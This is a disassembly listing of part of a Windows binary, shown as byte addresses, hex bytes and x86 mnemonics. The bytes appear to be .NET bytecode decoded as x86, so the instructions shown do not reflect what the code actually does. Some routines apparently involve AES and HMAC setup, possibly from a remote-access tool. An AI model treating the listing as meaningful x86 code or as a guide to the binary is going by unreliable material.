  40515e:	00 00                	add    %al,(%eax)
  405160:	0a a2 25 1b 17 14    	or     0x14171b25(%edx),%ah
  405166:	28 f2                	sub    %dh,%dl
  405168:	00 00                	add    %al,(%eax)
  40516a:	0a a2 25 1c 17 14    	or     0x14171c25(%edx),%ah
  405170:	28 f2                	sub    %dh,%dl
  405172:	00 00                	add    %al,(%eax)
  405174:	0a a2 25 1d 17 14    	or     0x14171d25(%edx),%ah
  40517a:	28 f2                	sub    %dh,%dl
  40517c:	00 00                	add    %al,(%eax)
  40517e:	0a a2 25 1e 17 14    	or     0x14171e25(%edx),%ah
  405184:	28 f2                	sub    %dh,%dl
  405186:	00 00                	add    %al,(%eax)
  405188:	0a a2 28 f3 00 00    	or     0xf328(%edx),%ah
  40518e:	0a 28                	or     (%eax),%ch
  405190:	f4                   	hlt
  405191:	00 00                	add    %al,(%eax)
  405193:	0a 80 3c 00 00 04    	or     0x400003c(%eax),%al
  405199:	7e 3c                	jle    0x4051d7
  40519b:	00 00                	add    %al,(%eax)
  40519d:	04 7b                	add    $0x7b,%al
  40519f:	f5                   	cmc
  4051a0:	00 00                	add    %al,(%eax)
  4051a2:	0a 7e 3c             	or     0x3c(%esi),%bh
  4051a5:	00 00                	add    %al,(%eax)
  4051a7:	04 06                	add    $0x6,%al
  4051a9:	28 06                	sub    %al,(%esi)
  4051ab:	00 00                	add    %al,(%eax)
  4051ad:	06                   	push   %es
  4051ae:	7e 0b                	jle    0x4051bb
  4051b0:	00 00                	add    %al,(%eax)
  4051b2:	04 7e                	add    $0x7e,%al
  4051b4:	10 00                	adc    %al,(%eax)
  4051b6:	00 04 02             	add    %al,(%edx,%eax,1)
  4051b9:	72 93                	jb     0x40514e
  4051bb:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4051bf:	4d                   	dec    %ebp
  4051c0:	00 00                	add    %al,(%eax)
  4051c2:	06                   	push   %es
  4051c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4051c4:	48                   	dec    %eax
  4051c5:	00 00                	add    %al,(%eax)
  4051c7:	06                   	push   %es
  4051c8:	7e 39                	jle    0x405203
  4051ca:	00 00                	add    %al,(%eax)
  4051cc:	04 7e                	add    $0x7e,%al
  4051ce:	08 00                	or     %al,(%eax)
  4051d0:	00 04 7e             	add    %al,(%esi,%edi,2)
  4051d3:	0f 00 00             	sldt   (%eax)
  4051d6:	04 7e                	add    $0x7e,%al
  4051d8:	04 00                	add    $0x0,%al
  4051da:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4051dd:	f6 00 00             	testb  $0x0,(%eax)
  4051e0:	0a 28                	or     (%eax),%ch
  4051e2:	94                   	xchg   %eax,%esp
  4051e3:	00 00                	add    %al,(%eax)
  4051e5:	06                   	push   %es
  4051e6:	2a 00                	sub    (%eax),%al
  4051e8:	1b 30                	sbb    (%eax),%esi
  4051ea:	03 00                	add    (%eax),%eax
  4051ec:	53                   	push   %ebx
  4051ed:	00 00                	add    %al,(%eax)
  4051ef:	00 27                	add    %ah,(%edi)
  4051f1:	00 00                	add    %al,(%eax)
  4051f3:	11 02                	adc    %eax,(%edx)
  4051f5:	28 1a                	sub    %bl,(%edx)
  4051f7:	00 00                	add    %al,(%eax)
  4051f9:	0a 03                	or     (%ebx),%al
  4051fb:	28 f7                	sub    %dh,%bh
  4051fd:	00 00                	add    %al,(%eax)
  4051ff:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  405202:	72 c1                	jb     0x4051c5
  405204:	26 00 70 73          	add    %dh,%es:0x73(%eax)
  405208:	f8                   	clc
  405209:	00 00                	add    %al,(%eax)
  40520b:	0a 7a 03             	or     0x3(%edx),%bh
  40520e:	7e 43                	jle    0x405253
  405210:	00 00                	add    %al,(%eax)
  405212:	04 20                	add    $0x20,%al
  405214:	50                   	push   %eax
  405215:	c3                   	ret
  405216:	00 00                	add    %al,(%eax)
  405218:	73 f9                	jae    0x405213
  40521a:	00 00                	add    %al,(%eax)
  40521c:	0a 0a                	or     (%edx),%cl
  40521e:	02 06                	add    (%esi),%al
  405220:	1f                   	pop    %ds
  405221:	20 6f fa             	and    %ch,-0x6(%edi)
  405224:	00 00                	add    %al,(%eax)
  405226:	0a 7d 41             	or     0x41(%ebp),%bh
  405229:	00 00                	add    %al,(%eax)
  40522b:	04 02                	add    $0x2,%al
  40522d:	06                   	push   %es
  40522e:	1f                   	pop    %ds
  40522f:	40                   	inc    %eax
  405230:	6f                   	outsl  %ds:(%esi),(%dx)
  405231:	fa                   	cli
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 7d 42             	or     0x42(%ebp),%bh
  405237:	00 00                	add    %al,(%eax)
  405239:	04 de                	add    $0xde,%al
  40523b:	0a 06                	or     (%esi),%al
  40523d:	2c 06                	sub    $0x6,%al
  40523f:	06                   	push   %es
  405240:	6f                   	outsl  %ds:(%esi),(%dx)
  405241:	33 00                	xor    (%eax),%eax
  405243:	00 0a                	add    %cl,(%edx)
  405245:	dc 2a                	fsubrl (%edx)
  405247:	00 01                	add    %al,(%ecx)
  405249:	10 00                	adc    %al,(%eax)
  40524b:	00 02                	add    %al,(%edx)
  40524d:	00 2a                	add    %ch,(%edx)
  40524f:	00 1e                	add    %bl,(%esi)
  405251:	48                   	dec    %eax
  405252:	00 0a                	add    %cl,(%edx)
  405254:	00 00                	add    %al,(%eax)
  405256:	00 00                	add    %al,(%eax)
  405258:	1b 30                	sbb    (%eax),%esi
  40525a:	05 00 00 01 00       	add    $0x10000,%eax
  40525f:	00 28                	add    %ch,(%eax)
  405261:	00 00                	add    %al,(%eax)
  405263:	11 03                	adc    %eax,(%ebx)
  405265:	2d 0b 72 09 27       	sub    $0x2709720b,%eax
  40526a:	00 70 73             	add    %dh,0x73(%eax)
  40526d:	fc                   	cld
  40526e:	00 00                	add    %al,(%eax)
  405270:	0a 7a 73             	or     0x73(%edx),%bh
  405273:	79 00                	jns    0x405275
  405275:	00 0a                	add    %cl,(%edx)
  405277:	0a 06                	or     (%esi),%al
  405279:	1f                   	pop    %ds
  40527a:	20 6a 6f             	and    %ch,0x6f(%edx)
  40527d:	4e                   	dec    %esi
  40527e:	00 00                	add    %al,(%eax)
  405280:	0a 73 fd             	or     -0x3(%ebx),%dh
  405283:	00 00                	add    %al,(%eax)
  405285:	0a 0b                	or     (%ebx),%cl
  405287:	07                   	pop    %es
  405288:	20 00                	and    %al,(%eax)
  40528a:	01 00                	add    %eax,(%eax)
  40528c:	00 6f fe             	add    %ch,-0x2(%edi)
  40528f:	00 00                	add    %al,(%eax)
  405291:	0a 07                	or     (%edi),%al
  405293:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  405299:	ff 00                	incl   (%eax)
  40529b:	00 0a                	add    %cl,(%edx)
  40529d:	07                   	pop    %es
  40529e:	17                   	pop    %ss
  40529f:	6f                   	outsl  %ds:(%esi),(%dx)
  4052a0:	00 01                	add    %al,(%ecx)
  4052a2:	00 0a                	add    %cl,(%edx)
  4052a4:	07                   	pop    %es
  4052a5:	18 6f 01             	sbb    %ch,0x1(%edi)
  4052a8:	01 00                	add    %eax,(%eax)
  4052aa:	0a 07                	or     (%edi),%al
  4052ac:	02 7b 41             	add    0x41(%ebx),%bh
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	04 6f                	add    $0x6f,%al
  4052b3:	02 01                	add    (%ecx),%al
  4052b5:	00 0a                	add    %cl,(%edx)
  4052b7:	07                   	pop    %es
  4052b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4052b9:	03 01                	add    (%ecx),%eax
  4052bb:	00 0a                	add    %cl,(%edx)
  4052bd:	06                   	push   %es
  4052be:	07                   	pop    %es
  4052bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4052c0:	04 01                	add    $0x1,%al
  4052c2:	00 0a                	add    %cl,(%edx)
  4052c4:	17                   	pop    %ss
  4052c5:	73 05                	jae    0x4052cc
  4052c7:	01 00                	add    %eax,(%eax)
  4052c9:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4052cc:	07                   	pop    %es
  4052cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4052ce:	06                   	push   %es
  4052cf:	01 00                	add    %eax,(%eax)
  4052d1:	0a 16                	or     (%esi),%dl
  4052d3:	07                   	pop    %es
  4052d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4052d5:	06                   	push   %es
  4052d6:	01 00                	add    %eax,(%eax)
  4052d8:	0a 8e 69 6f 4c 00    	or     0x4c6f69(%esi),%cl
  4052de:	00 0a                	add    %cl,(%edx)
  4052e0:	08 03                	or     %al,(%ebx)
  4052e2:	16                   	push   %ss
  4052e3:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  4052e9:	00 0a                	add    %cl,(%edx)
  4052eb:	08 6f 07             	or     %ch,0x7(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 02                	or     (%edx),%al
  4052f2:	7b 42                	jnp    0x405336
  4052f4:	00 00                	add    %al,(%eax)
  4052f6:	04 73                	add    $0x73,%al
  4052f8:	08 01                	or     %al,(%ecx)
  4052fa:	00 0a                	add    %cl,(%edx)
  4052fc:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  405301:	01 00                	add    %eax,(%eax)
  405303:	0a 1f                	or     (%edi),%bl
  405305:	20 06                	and    %al,(%esi)
  405307:	6f                   	outsl  %ds:(%esi),(%dx)
  405308:	09 01                	or     %eax,(%ecx)
  40530a:	00 0a                	add    %cl,(%edx)
  40530c:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40530f:	20 59 6f             	and    %bl,0x6f(%ecx)
  405312:	0a 01                	or     (%ecx),%al
  405314:	00 0a                	add    %cl,(%edx)
  405316:	13 04 06             	adc    (%esi,%eax,1),%eax
  405319:	16                   	push   %ss
  40531a:	6a 6f                	push   $0x6f
  40531c:	4e                   	dec    %esi
  40531d:	00 00                	add    %al,(%eax)
  40531f:	0a 06                	or     (%esi),%al
  405321:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405324:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  405327:	69 6f 4c 00 00 0a de 	imul   $0xde0a0000,0x4c(%edi),%ebp
  40532e:	1e                   	push   %ds
  40532f:	09 2c 06             	or     %ebp,(%esi,%eax,1)
  405332:	09 6f 33             	or     %ebp,0x33(%edi)
  405335:	00 00                	add    %al,(%eax)
  405337:	0a dc                	or     %ah,%bl
  405339:	08 2c 06             	or     %ch,(%esi,%eax,1)
  40533c:	08 6f 33             	or     %ch,0x33(%edi)
  40533f:	00 00                	add    %al,(%eax)
  405341:	0a dc                	or     %ah,%bl
  405343:	07                   	pop    %es
  405344:	2c 06                	sub    $0x6,%al
  405346:	07                   	pop    %es
  405347:	6f                   	outsl  %ds:(%esi),(%dx)
  405348:	33 00                	xor    (%eax),%eax
  40534a:	00 0a                	add    %cl,(%edx)
  40534c:	dc 06                	faddl  (%esi)
  40534e:	6f                   	outsl  %ds:(%esi),(%dx)
  40534f:	09 01                	or     %eax,(%ecx)
  405351:	00 0a                	add    %cl,(%edx)
  405353:	13 05 de 0a 06 2c    	adc    0x2c060ade,%eax
  405359:	06                   	push   %es
  40535a:	06                   	push   %es
  40535b:	6f                   	outsl  %ds:(%esi),(%dx)
  40535c:	33 00                	xor    (%eax),%eax
  40535e:	00 0a                	add    %cl,(%edx)
  405360:	dc 11                	fcoml  (%ecx)
  405362:	05 2a 01 34 00       	add    $0x34012a,%eax
  405367:	00 02                	add    %al,(%edx)
  405369:	00 99 00 32 cb 00    	add    %bl,0xcb3200(%ecx)
  40536f:	0a 00                	or     (%eax),%al
  405371:	00 00                	add    %al,(%eax)
  405373:	00 02                	add    %al,(%edx)
  405375:	00 67 00             	add    %ah,0x0(%edi)
  405378:	6e                   	outsb  %ds:(%esi),(%dx)
  405379:	d5 00                	aad    $0x0
  40537b:	0a 00                	or     (%eax),%al
  40537d:	00 00                	add    %al,(%eax)
  40537f:	00 02                	add    %al,(%edx)
  405381:	00 23                	add    %ah,(%ebx)
  405383:	00 bc df 00 0a 00 00 	add    %bh,0xa00(%edi,%ebx,8)
  40538a:	00 00                	add    %al,(%eax)
  40538c:	02 00                	add    (%eax),%al
  40538e:	14 00                	adc    $0x0,%al
  405390:	df f3                	fcomip %st(3),%st
  405392:	00 0a                	add    %cl,(%edx)
  405394:	00 00                	add    %al,(%eax)
  405396:	00 00                	add    %al,(%eax)
  405398:	1b 30                	sbb    (%eax),%esi
  40539a:	05 00 37 01 00       	add    $0x13700,%eax
  40539f:	00 29                	add    %ch,(%ecx)
  4053a1:	00 00                	add    %al,(%eax)
  4053a3:	11 03                	adc    %eax,(%ebx)
  4053a5:	2d 0b 72 09 27       	sub    $0x2709720b,%eax
  4053aa:	00 70 73             	add    %dh,0x73(%eax)
  4053ad:	fc                   	cld
  4053ae:	00 00                	add    %al,(%eax)
  4053b0:	0a 7a 03             	or     0x3(%edx),%bh
  4053b3:	73 4d                	jae    0x405402
  4053b5:	00 00                	add    %al,(%eax)
  4053b7:	0a 0a                	or     (%edx),%cl
  4053b9:	73 fd                	jae    0x4053b8
  4053bb:	00 00                	add    %al,(%eax)
  4053bd:	0a 0b                	or     (%ebx),%cl
  4053bf:	07                   	pop    %es
  4053c0:	20 00                	and    %al,(%eax)
  4053c2:	01 00                	add    %eax,(%eax)
  4053c4:	00 6f fe             	add    %ch,-0x2(%edi)
  4053c7:	00 00                	add    %al,(%eax)
  4053c9:	0a 07                	or     (%edi),%al
  4053cb:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4053d1:	ff 00                	incl   (%eax)
  4053d3:	00 0a                	add    %cl,(%edx)
  4053d5:	07                   	pop    %es
  4053d6:	17                   	pop    %ss
  4053d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4053d8:	00 01                	add    %al,(%ecx)
  4053da:	00 0a                	add    %cl,(%edx)
  4053dc:	07                   	pop    %es
  4053dd:	18 6f 01             	sbb    %ch,0x1(%edi)
  4053e0:	01 00                	add    %eax,(%eax)
  4053e2:	0a 07                	or     (%edi),%al
  4053e4:	02 7b 41             	add    0x41(%ebx),%bh
  4053e7:	00 00                	add    %al,(%eax)
  4053e9:	04 6f                	add    $0x6f,%al
  4053eb:	02 01                	add    (%ecx),%al
  4053ed:	00 0a                	add    %cl,(%edx)
  4053ef:	02 7b 42             	add    0x42(%ebx),%bh
  4053f2:	00 00                	add    %al,(%eax)
  4053f4:	04 73                	add    $0x73,%al
  4053f6:	08 01                	or     %al,(%ecx)
  4053f8:	00 0a                	add    %cl,(%edx)
  4053fa:	0d 09 06 6f 09       	or     $0x96f0609,%eax
  4053ff:	01 00                	add    %eax,(%eax)
  405401:	0a 1f                	or     (%edi),%bl
  405403:	20 06                	and    %al,(%esi)
  405405:	6f                   	outsl  %ds:(%esi),(%dx)
  405406:	09 01                	or     %eax,(%ecx)
  405408:	00 0a                	add    %cl,(%edx)
  40540a:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40540d:	20 59 6f             	and    %bl,0x6f(%ecx)
  405410:	0a 01                	or     (%ecx),%al
  405412:	00 0a                	add    %cl,(%edx)
  405414:	13 04 1f             	adc    (%edi,%ebx,1),%eax
  405417:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40541d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  405423:	11 05 8e 69 6f 45    	adc    %eax,0x456f698e
  405429:	00 00                	add    %al,(%eax)
  40542b:	0a 26                	or     (%esi),%ah
  40542d:	02 11                	add    (%ecx),%dl
  40542f:	04 11                	add    $0x11,%al
  405431:	05 28 9c 00 00       	add    $0x9c28,%eax
  405436:	06                   	push   %es
  405437:	2d 0b 72 37 27       	sub    $0x2737720b,%eax
  40543c:	00 70 73             	add    %dh,0x73(%eax)
  40543f:	0b 01                	or     (%ecx),%eax
  405441:	00 0a                	add    %cl,(%edx)
  405443:	7a de                	jp     0x405423
  405445:	0a 09                	or     (%ecx),%cl
  405447:	2c 06                	sub    $0x6,%al
  405449:	09 6f 33             	or     %ebp,0x33(%edi)
  40544c:	00 00                	add    %al,(%eax)
  40544e:	0a dc                	or     %ah,%bl
  405450:	1f                   	pop    %ds
  405451:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  405457:	0c 06                	or     $0x6,%al
  405459:	08 16                	or     %dl,(%esi)
  40545b:	1f                   	pop    %ds
  40545c:	10 6f 45             	adc    %ch,0x45(%edi)
  40545f:	00 00                	add    %al,(%eax)
  405461:	0a 26                	or     (%esi),%ah
  405463:	07                   	pop    %es
  405464:	08 6f 0c             	or     %ch,0xc(%edi)
  405467:	01 00                	add    %eax,(%eax)
  405469:	0a 06                	or     (%esi),%al
  40546b:	07                   	pop    %es
  40546c:	6f                   	outsl  %ds:(%esi),(%dx)
  40546d:	0d 01 00 0a 16       	or     $0x160a0001,%eax
  405472:	73 05                	jae    0x405479
  405474:	01 00                	add    %eax,(%eax)
  405476:	0a 13                	or     (%ebx),%dl
  405478:	06                   	push   %es
  405479:	06                   	push   %es
  40547a:	6f                   	outsl  %ds:(%esi),(%dx)
  40547b:	75 00                	jne    0x40547d
  40547d:	00 0a                	add    %cl,(%edx)
  40547f:	1f                   	pop    %ds
  405480:	10 6a 59             	adc    %ch,0x59(%edx)
  405483:	17                   	pop    %ss
  405484:	6a 58                	push   $0x58
  405486:	d4 8d                	aam    $0x8d
  405488:	44                   	inc    %esp
  405489:	00 00                	add    %al,(%eax)
  40548b:	01 13                	add    %edx,(%ebx)
  40548d:	07                   	pop    %es
  40548e:	11 06                	adc    %eax,(%esi)
  405490:	11 07                	adc    %eax,(%edi)
  405492:	16                   	push   %ss
  405493:	11 07                	adc    %eax,(%edi)
  405495:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405498:	45                   	inc    %ebp
  405499:	00 00                	add    %al,(%eax)
  40549b:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4054a1:	13 08                	adc    (%eax),%ecx
  4054a3:	11 07                	adc    %eax,(%edi)
  4054a5:	16                   	push   %ss
  4054a6:	11 08                	adc    %ecx,(%eax)
  4054a8:	16                   	push   %ss
  4054a9:	11 08                	adc    %ecx,(%eax)
  4054ab:	8e 69 28             	mov    0x28(%ecx),%gs
  4054ae:	0e                   	push   %cs
  4054af:	01 00                	add    %eax,(%eax)
  4054b1:	0a 11                	or     (%ecx),%dl
  4054b3:	08 13                	or     %dl,(%ebx)
  4054b5:	09 de                	or     %ebx,%esi
  4054b7:	20 11                	and    %dl,(%ecx)
  4054b9:	06                   	push   %es
  4054ba:	2c 07                	sub    $0x7,%al
  4054bc:	11 06                	adc    %eax,(%esi)
  4054be:	6f                   	outsl  %ds:(%esi),(%dx)
  4054bf:	33 00                	xor    (%eax),%eax
  4054c1:	00 0a                	add    %cl,(%edx)
  4054c3:	dc 07                	faddl  (%edi)
  4054c5:	2c 06                	sub    $0x6,%al
  4054c7:	07                   	pop    %es
  4054c8:	6f                   	outsl  %ds:(%esi),(%dx)
  4054c9:	33 00                	xor    (%eax),%eax
  4054cb:	00 0a                	add    %cl,(%edx)
  4054cd:	dc 06                	faddl  (%esi)
  4054cf:	2c 06                	sub    $0x6,%al
  4054d1:	06                   	push   %es
  4054d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4054d3:	33 00                	xor    (%eax),%eax
  4054d5:	00 0a                	add    %cl,(%edx)
  4054d7:	dc 11                	fcoml  (%ecx)
  4054d9:	09 2a                	or     %ebp,(%edx)
  4054db:	00 41 64             	add    %al,0x64(%ecx)
  4054de:	00 00                	add    %al,(%eax)
  4054e0:	02 00                	add    (%eax),%al
  4054e2:	00 00                	add    %al,(%eax)
  4054e4:	57                   	push   %edi
  4054e5:	00 00                	add    %al,(%eax)
  4054e7:	00 4b 00             	add    %cl,0x0(%ebx)
  4054ea:	00 00                	add    %al,(%eax)
  4054ec:	a2 00 00 00 0a       	mov    %al,0xa000000
  4054f1:	00 00                	add    %al,(%eax)
  4054f3:	00 00                	add    %al,(%eax)
  4054f5:	00 00                	add    %al,(%eax)
  4054f7:	00 02                	add    %al,(%edx)
  4054f9:	00 00                	add    %al,(%eax)
  4054fb:	00 d5                	add    %dl,%ch
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 3f                	add    %bh,(%edi)
  405501:	00 00                	add    %al,(%eax)
  405503:	00 14 01             	add    %dl,(%ecx,%eax,1)
  405506:	00 00                	add    %al,(%eax)
  405508:	0c 00                	or     $0x0,%al
  40550a:	00 00                	add    %al,(%eax)
  40550c:	00 00                	add    %al,(%eax)
  40550e:	00 00                	add    %al,(%eax)
  405510:	02 00                	add    (%eax),%al
  405512:	00 00                	add    %al,(%eax)
  405514:	1b 00                	sbb    (%eax),%eax
  405516:	00 00                	add    %al,(%eax)
  405518:	05 01 00 00 20       	add    $0x20000001,%eax
  40551d:	01 00                	add    %eax,(%eax)
  40551f:	00 0a                	add    %cl,(%edx)
  405521:	00 00                	add    %al,(%eax)
  405523:	00 00                	add    %al,(%eax)
  405525:	00 00                	add    %al,(%eax)
  405527:	00 02                	add    %al,(%edx)
  405529:	00 00                	add    %al,(%eax)
  40552b:	00 15 00 00 00 15    	add    %dl,0x15000000
  405531:	01 00                	add    %eax,(%eax)
  405533:	00 2a                	add    %ch,(%edx)
  405535:	01 00                	add    %eax,(%eax)
  405537:	00 0a                	add    %cl,(%edx)
  405539:	00 00                	add    %al,(%eax)
  40553b:	00 00                	add    %al,(%eax)
  40553d:	00 00                	add    %al,(%eax)
  40553f:	00 13                	add    %dl,(%ebx)
  405541:	30 03                	xor    %al,(%ebx)
  405543:	00 1c 00             	add    %bl,(%eax,%eax,1)
  405546:	00 00                	add    %al,(%eax)
  405548:	2a 00                	sub    (%eax),%al
  40554a:	00 11                	add    %dl,(%ecx)
  40554c:	17                   	pop    %ss
  40554d:	0a 16                	or     (%esi),%dl
  40554f:	0b 2b                	or     (%ebx),%ebp
  405551:	0e                   	push   %cs
  405552:	03 07                	add    (%edi),%eax
  405554:	91                   	xchg   %eax,%ecx
  405555:	04 07                	add    $0x7,%al
  405557:	91                   	xchg   %eax,%ecx
  405558:	2e 02 16             	add    %cs:(%esi),%dl
  40555b:	0a 07                	or     (%edi),%al
  40555d:	17                   	pop    %ss
  40555e:	58                   	pop    %eax
  40555f:	0b 07                	or     (%edi),%eax
  405561:	03 8e 69 32 ec 06    	add    0x6ec3269(%esi),%ecx
  405567:	2a 1b                	sub    (%ebx),%bl
  405569:	30 03                	xor    %al,(%ebx)
  40556b:	00 65 00             	add    %ah,0x0(%ebp)
  40556e:	00 00                	add    %al,(%eax)
  405570:	2b 00                	sub    (%eax),%eax
  405572:	00 11                	add    %dl,(%ecx)
  405574:	28 1b                	sub    %bl,(%ebx)
  405576:	00 00                	add    %al,(%eax)
  405578:	0a 02                	or     (%edx),%al
  40557a:	6f                   	outsl  %ds:(%esi),(%dx)
  40557b:	21 00                	and    %eax,(%eax)
  40557d:	00 0a                	add    %cl,(%edx)
  40557f:	0a 73 0f             	or     0xf(%ebx),%dh
  405582:	01 00                	add    %eax,(%eax)
  405584:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  405587:	06                   	push   %es
  405588:	6f                   	outsl  %ds:(%esi),(%dx)
  405589:	c5 00                	lds    (%eax),%eax
  40558b:	00 0a                	add    %cl,(%edx)
  40558d:	0a de                	or     %dh,%bl
  40558f:	0a 08                	or     (%eax),%cl
  405591:	2c 06                	sub    $0x6,%al
  405593:	08 6f 33             	or     %ch,0x33(%edi)
  405596:	00 00                	add    %al,(%eax)
  405598:	0a dc                	or     %ah,%bl
  40559a:	73 53                	jae    0x4055ef
  40559c:	00 00                	add    %al,(%eax)
  40559e:	0a 0b                	or     (%ebx),%cl
  4055a0:	06                   	push   %es
  4055a1:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4055a6:	1f                   	pop    %ds
  4055a7:	09 11                	or     %edx,(%ecx)
  4055a9:	04 91                	add    $0x91,%al
  4055ab:	13 05 07 12 05 72    	adc    0x72051207,%eax
  4055b1:	8d 27                	lea    (%edi),%esp
  4055b3:	00 70 28             	add    %dh,0x28(%eax)
  4055b6:	c6 00 00             	movb   $0x0,(%eax)
  4055b9:	0a 6f 55             	or     0x55(%edi),%ch
  4055bc:	00 00                	add    %al,(%eax)
  4055be:	0a 26                	or     (%esi),%ah
  4055c0:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4055c3:	58                   	pop    %eax
  4055c4:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4055c7:	04 09                	add    $0x9,%al
  4055c9:	8e 69 32             	mov    0x32(%ecx),%gs
  4055cc:	da 07                	fiaddl (%edi)
  4055ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4055cf:	38 00                	cmp    %al,(%eax)
  4055d1:	00 0a                	add    %cl,(%edx)
  4055d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4055d4:	c8 00 00 0a          	enter  $0x0,$0xa
  4055d8:	2a 00                	sub    (%eax),%al
  4055da:	00 00                	add    %al,(%eax)
  4055dc:	01 10                	add    %edx,(%eax)
  4055de:	00 00                	add    %al,(%eax)
  4055e0:	02 00                	add    (%eax),%al
  4055e2:	12 00                	adc    (%eax),%al
  4055e4:	0a 1c 00             	or     (%eax,%eax,1),%bl
  4055e7:	0a 00                	or     (%eax),%al
  4055e9:	00 00                	add    %al,(%eax)
  4055eb:	00 1b                	add    %bl,(%ebx)
  4055ed:	30 02                	xor    %al,(%edx)
  4055ef:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4055f2:	00 00                	add    %al,(%eax)
  4055f4:	2c 00                	sub    $0x0,%al
  4055f6:	00 11                	add    %dl,(%ecx)
  4055f8:	73 0f                	jae    0x405609
  4055fa:	01 00                	add    %eax,(%eax)
  4055fc:	0a 0a                	or     (%edx),%cl
  4055fe:	06                   	push   %es
  4055ff:	02 6f c5             	add    -0x3b(%edi),%ch
  405602:	00 00                	add    %al,(%eax)
  405604:	0a 0b                	or     (%ebx),%cl
  405606:	de 0a                	fimuls (%edx)
  405608:	06                   	push   %es
  405609:	2c 06                	sub    $0x6,%al
  40560b:	06                   	push   %es
  40560c:	6f                   	outsl  %ds:(%esi),(%dx)
  40560d:	33 00                	xor    (%eax),%eax
  40560f:	00 0a                	add    %cl,(%edx)
  405611:	dc 07                	faddl  (%edi)
  405613:	2a 01                	sub    (%ecx),%al
  405615:	10 00                	adc    %al,(%eax)
  405617:	00 02                	add    %al,(%edx)
  405619:	00 06                	add    %al,(%esi)
  40561b:	00 0a                	add    %cl,(%edx)
  40561d:	10 00                	adc    %al,(%eax)
  40561f:	0a 00                	or     (%eax),%al
  405621:	00 00                	add    %al,(%eax)
  405623:	00 1b                	add    %bl,(%ebx)
  405625:	30 04 00             	xor    %al,(%eax,%eax,1)
  405628:	58                   	pop    %eax
  405629:	00 00                	add    %al,(%eax)
  40562b:	00 2d 00 00 11 02    	add    %ch,0x2110000
  405631:	73 4d                	jae    0x405680
  405633:	00 00                	add    %al,(%eax)
  405635:	0a 0a                	or     (%edx),%cl
  405637:	1a 8d 44 00 00 01    	sbb    0x1000044(%ebp),%cl
  40563d:	0b 06                	or     (%esi),%eax
  40563f:	07                   	pop    %es
  405640:	16                   	push   %ss
  405641:	1a 6f 45             	sbb    0x45(%edi),%ch
  405644:	00 00                	add    %al,(%eax)
  405646:	0a 26                	or     (%esi),%ah
  405648:	07                   	pop    %es
  405649:	16                   	push   %ss
  40564a:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40564e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  405651:	16                   	push   %ss
  405652:	73 10                	jae    0x405664
  405654:	01 00                	add    %eax,(%eax)
  405656:	0a 0d 08 8d 44 00    	or     0x448d08,%cl
  40565c:	00 01                	add    %al,(%ecx)
  40565e:	13 04 09             	adc    (%ecx,%ecx,1),%eax
  405661:	11 04 16             	adc    %eax,(%esi,%edx,1)
  405664:	08 6f 45             	or     %ch,0x45(%edi)
  405667:	00 00                	add    %al,(%eax)
  405669:	0a 26                	or     (%esi),%ah
  40566b:	11 04 13             	adc    %eax,(%ebx,%edx,1)
  40566e:	05 de 14 09 2c       	add    $0x2c0914de,%eax
  405673:	06                   	push   %es
  405674:	09 6f 33             	or     %ebp,0x33(%edi)
  405677:	00 00                	add    %al,(%eax)
  405679:	0a dc                	or     %ah,%bl
  40567b:	06                   	push   %es
  40567c:	2c 06                	sub    $0x6,%al
  40567e:	06                   	push   %es
  40567f:	6f                   	outsl  %ds:(%esi),(%dx)
  405680:	33 00                	xor    (%eax),%eax
  405682:	00 0a                	add    %cl,(%edx)
  405684:	dc 11                	fcoml  (%ecx)
  405686:	05 2a 01 1c 00       	add    $0x1c012a,%eax
  40568b:	00 02                	add    %al,(%edx)
  40568d:	00 28                	add    %ch,(%eax)
  40568f:	00 19                	add    %bl,(%ecx)
  405691:	41                   	inc    %ecx
  405692:	00 0a                	add    %cl,(%edx)
  405694:	00 00                	add    %al,(%eax)
  405696:	00 00                	add    %al,(%eax)
  405698:	02 00                	add    (%eax),%al
  40569a:	07                   	pop    %es
  40569b:	00 44 4b 00          	add    %al,0x0(%ebx,%ecx,2)
  40569f:	0a 00                	or     (%eax),%al
  4056a1:	00 00                	add    %al,(%eax)
  4056a3:	00 1b                	add    %bl,(%ebx)
  4056a5:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056a8:	52                   	push   %edx
  4056a9:	00 00                	add    %al,(%eax)
  4056ab:	00 2e                	add    %ch,(%esi)
  4056ad:	00 00                	add    %al,(%eax)
  4056af:	11 73 79             	adc    %esi,0x79(%ebx)
  4056b2:	00 00                	add    %al,(%eax)
  4056b4:	0a 0a                	or     (%edx),%cl
